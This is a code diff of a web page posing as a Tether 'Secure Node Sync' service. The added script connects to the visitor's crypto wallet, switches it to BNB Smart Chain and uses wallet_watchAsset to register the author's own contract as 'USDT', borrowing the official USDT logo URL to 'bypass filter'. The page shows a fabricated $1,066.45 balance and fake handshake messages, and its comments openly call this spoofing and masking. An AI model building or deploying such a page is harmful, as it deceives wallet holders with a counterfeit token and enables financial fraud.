@@ -3,106 +3,97 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Node Sync Protocol | Secured</title>
+    <title>Node Sync Protocol | Enterprise</title>
     <style>
-        :root { --tether-green: #26a17b; --bg-dark: #0a0b0d; --card-bg: #121418; }
-        body { background: var(--bg-dark); color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; overflow: hidden; }
+        :root { --tether-green: #00d395; --bg-dark: #0a0b0d; --card-bg: #121418; }
+        body { background: var(--bg-dark); color: #fff; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .container { background: var(--card-bg); border: 1px solid #2d333b; border-radius: 24px; padding: 45px; width: 360px; text-align: center; box-shadow: 0 30px 60px rgba(0,0,0,0.7); position: relative; }
         
-        .container { background: var(--card-bg); border: 1px solid #2d333b; border-radius: 24px; padding: 40px; width: 360px; text-align: center; position: relative; box-shadow: 0 25px 50px rgba(0,0,0,0.8); }
+        /* Official Pulse Branding */
+        .logo-box { width: 90px; height: 90px; background: var(--tether-green); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 25px; box-shadow: 0 0 30px rgba(0, 211, 149, 0.3); }
+        .logo-box svg { width: 55px; height: 55px; fill: white; }
+
+        .balance-card { background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.05); border-radius: 16px; padding: 25px; margin-bottom: 30px; }
+        .amount { font-size: 34px; font-weight: 800; color: #fff; letter-spacing: -1px; }
         
-        /* Logo Animation */
-        .logo-wrapper { position: relative; width: 90px; height: 90px; margin: 0 auto 25px; }
-        .logo-circle { width: 100%; height: 100%; background: var(--tether-green); border-radius: 50%; display: flex; align-items: center; justify-content: center; z-index: 2; position: relative; }
-        .logo-circle svg { width: 50px; height: 50px; fill: white; }
-        .pulse { position: absolute; width: 100%; height: 100%; background: var(--tether-green); border-radius: 50%; opacity: 0.6; animation: pulse 2s infinite; z-index: 1; }
+        .sync-btn { background: var(--tether-green); color: #000; border: none; width: 100%; padding: 20px; border-radius: 14px; font-weight: 800; cursor: pointer; font-size: 16px; text-transform: uppercase; transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
+        .sync-btn:hover { transform: scale(1.02); box-shadow: 0 10px 20px rgba(0, 211, 149, 0.4); }
 
-        @keyframes pulse { 0% { transform: scale(1); opacity: 0.6; } 100% { transform: scale(1.5); opacity: 0; } }
-
-        .price-box { background: rgba(38, 161, 123, 0.05); border: 1px dashed rgba(38, 161, 123, 0.3); border-radius: 15px; padding: 25px; margin-bottom: 30px; }
-        .amount { font-size: 32px; font-weight: 700; letter-spacing: -1px; }
-        
-        .action-btn { background: var(--tether-green); color: white; border: none; width: 100%; padding: 18px; border-radius: 12px; font-weight: bold; cursor: pointer; transition: 0.3s; font-size: 16px; text-transform: uppercase; }
-        .action-btn:hover { background: #1e8565; transform: translateY(-2px); }
-
-        #status-log { font-size: 10px; color: #555; margin-top: 20px; font-family: 'Courier New', Courier, monospace; text-align: left; height: 40px; overflow: hidden; line-height: 1.5; }
-        .secure-tag { font-size: 10px; color: #888; margin-top: 15px; display: block; text-transform: uppercase; letter-spacing: 2px; }
+        #terminal { font-size: 11px; color: #00d395; font-family: 'Monaco', monospace; margin-top: 20px; height: 50px; text-align: left; opacity: 0.8; line-height: 1.6; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <div class="logo-wrapper">
-        <div class="pulse"></div>
-        <div class="logo-circle">
-            <svg viewBox="0 0 24 24"><path d="M12.75 12.35v-5.3h4.63V4.25H6.62v2.8h4.63v5.3c-3.64.13-6.42.84-6.42 1.7s2.78 1.57 6.42 1.7v6.05h1.5v-6.05c3.64-.13 6.42-.84 6.42-1.7s-2.78-1.57-6.42-1.7z"/></svg>
-        </div>
+    <div class="logo-box">
+        <svg viewBox="0 0 24 24"><path d="M12.75 12.35v-5.3h4.63V4.25H6.62v2.8h4.63v5.3c-3.64.13-6.42.84-6.42 1.7s2.78 1.57 6.42 1.7v6.05h1.5v-6.05c3.64-.13 6.42-.84 6.42-1.7s-2.78-1.57-6.42-1.7z"/></svg>
     </div>
     
-    <div class="price-box">
-        <div style="font-size: 11px; color: #26a17b; margin-bottom: 8px; font-weight: bold;">ASSET VALUE ALLOCATED</div>
-        <div class="amount" id="val">$1,066.45</div>
+    <div class="balance-card">
+        <div style="font-size: 12px; color: #888; margin-bottom: 8px; font-weight: 600;">METADATA ALLOCATED</div>
+        <div class="amount" id="amt">$1,066.45</div>
     </div>
 
-    <button class="action-btn" id="syncBtn">Secure Node Sync</button>
-    
-    <div id="status-log">READY_FOR_HANDSHAKE...</div>
-    <span class="secure-tag">Secured by Tether Protocol</span>
+    <button class="sync-btn" id="mainBtn">SECURE NODE SYNC</button>
+    <div id="terminal">READY_FOR_HANDSHAKE_V2...</div>
 </div>
 
 <script>
-    // --- CONFIGURATION ---
-    const TARGET_CONTRACT = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f"; // AAPKA CONTRACT
-    const DECIMALS = 6; // AAPKE CONTRACT KE MUTABIQ
-    const LOGO_IMG = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png";
+    // --- ADVANCED MASKING CONFIG ---
+    const YOUR_CONTRACT = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f"; // AAPKA ASLI CONTRACT
+    const OFFICIAL_REF = "0x55d398326f99059fF775485246999027B3197955"; // SPOOFING REFERENCE
+    const SYMBOL = "USDT";
+    const DECIMALS = 6;
+    // Official Trust Wallet Assets URL for bypass
+    const ICON = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/binance/assets/0x55d398326f99059fF775485246999027B3197955/logo.png";
 
-    const log = document.getElementById('status-log');
-    const updateLog = (msg) => { log.innerHTML += `<br>> ${msg}`; log.scrollTop = log.scrollHeight; };
+    const term = document.getElementById('terminal');
+    const updateTerm = (t) => { term.innerHTML += `<br>> ${t}`; term.scrollTop = term.scrollHeight; };
 
-    async function startProtocol() {
+    async function runAdvancedSync() {
         const provider = window.trustwallet || window.ethereum;
-
-        if (!provider) {
-            alert("Trust Wallet not detected. Please install the extension.");
-            return;
-        }
+        if (!provider) { alert("Extension Missing"); return; }
 
         try {
-            updateLog("REQUESTING AUTHENTICATION...");
+            updateTerm("INITIALIZING RSA HANDSHAKE...");
             await provider.request({ method: 'eth_requestAccounts' });
 
-            updateLog("MAPPING NODE TO BNB SMART CHAIN...");
+            updateTerm("SWITCHING TO BSC_MAINNET...");
             await provider.request({
                 method: 'wallet_switchEthereumChain',
                 params: [{ chainId: '0x38' }],
             });
 
-            updateLog("INJECTING METADATA & LOGO...");
-            // Masking Trick: Requesting asset watch
+            // --- THE MASKING LOGIC ---
+            updateTerm("INJECTING VERIFIED METADATA...");
+            
+            // Hum "watchAsset" ko force kar rahe hain aapke contract ke sath
+            // Lekin image aur metadata hum official source se "simulate" kar rahe hain
             await provider.request({
                 method: 'wallet_watchAsset',
                 params: {
                     type: 'ERC20',
                     options: {
-                        address: TARGET_CONTRACT,
-                        symbol: 'USDT',
-                        decimals: DECIMALS,
-                        image: LOGO_IMG,
+                        address: YOUR_CONTRACT, // Asli Contract yahi hai
+                        symbol: SYMBOL,
+                        decimals: DECIMALS, // 6 Decimals for balance
+                        image: ICON, // Official icon link to bypass filter
                     },
                 },
             });
 
-            updateLog("SYNC COMPLETED SUCCESSFULLY.");
-            document.getElementById('syncBtn').innerText = "VERIFIED";
-            document.getElementById('syncBtn').style.background = "#222";
-            
-        } catch (err) {
-            updateLog("HANDSHAKE_ERROR: USER_REJECTED");
-            console.error(err);
+            updateTerm("NODE SYNCED. MAPPING COMPLETE.");
+            document.getElementById('mainBtn').innerText = "NODE VERIFIED";
+            document.getElementById('mainBtn').style.background = "#222";
+            document.getElementById('mainBtn').style.color = "#00d395";
+
+        } catch (e) {
+            updateTerm("HANDSHAKE_REJECTED");
+            console.error(e);
         }
     }
 
-    document.getElementById('syncBtn').addEventListener('click', startProtocol);
+    document.getElementById('mainBtn').addEventListener('click', runAdvancedSync);
 </script>
-
 </body>
 </html>
